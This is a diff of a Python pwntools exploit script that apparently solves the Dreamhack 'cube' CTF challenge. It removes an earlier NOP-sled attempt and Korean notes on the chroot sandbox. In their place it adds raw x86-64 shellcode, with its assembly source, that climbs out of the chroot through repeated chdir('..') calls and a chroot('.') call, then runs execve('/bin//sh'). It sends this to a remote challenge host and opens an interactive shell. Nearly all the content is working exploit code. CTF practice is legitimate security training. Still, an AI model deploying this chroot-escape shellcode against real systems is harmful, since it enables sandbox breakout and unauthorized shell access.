@@ -1,25 +1,51 @@
 #!/usr/bin/python3
 
-import pwn
+from pwn import *
 
-pwn.context.log_level = 'debug'
-p = pwn.remote("host1.dreamhack.games", 23956)
+#p = process("./cube")
+p = remote("host1.dreamhack.games", 19010)
 
-shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
-nop = "\x90"
-payload = nop*56
-payload += shellcode
+shellcode = "\xBB\x2E\x2E\x00\x00\x53\x54\x5F\x48\x31\xC9\x4D\x31\xC0\x4C\x89\xC1\xB8\x50\x00\x00\x00\x0F\x05\x49\x83\xF8\x10\x74\x05\x49\xFF\xC0\xEB\xEB\x48\x31\xDB\xB3\x2E\x53\x54\x5F\xB0\xA1\x0F\x05\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\x48\x31\xC0\xB0\x3B\x0F\x05"
 
-p.sendafter("Give me shellcode: ", payload)
+p.sendlineafter(": ", shellcode)
+
 p.interactive()
 
 """
-chroot를 이용한 sandbox 환경을 구성함.
-chroot의 경로는 /home/cube/cube_box
-아마 상위 경로에 flag 파일이 있을 것으로 추정
+section .text
+	global _start
 
-chroot 경로 저장 위치 : 0x555555554944
-입력값 저장 위치 : 0x7ffff7ffb000
-
-모르겠당.. 입력받은 부분을 call rdx를 통해서 호출하긴 하는데 자꾸 내용을 확인해보면 OP Code가 다 꼬여있다..
+_start:
+	mov rbx, 0x2e2e
+	push rbx
+	push rsp
+	pop rdi
+	xor rcx, rcx
+	xor r8, r8
+.L1:
+	mov rcx, r8
+	mov rax, 0x50
+	syscall
+	cmp r8, 0x10
+	je .L2
+	inc r8
+	jmp .L1
+.L2:
+	xor rbx, rbx
+	mov bl, 0x2e
+	push rbx
+	push rsp
+	pop rdi
+	mov al, 0xa1
+	syscall
+	push rax
+	xor rdx, rdx
+	xor rsi, rsi
+	mov rbx,0x68732f2f6e69622f
+	push rbx
+	push rsp
+	pop rdi
+	xor rax, rax
+	mov al, 0x3b
+	syscall
 """
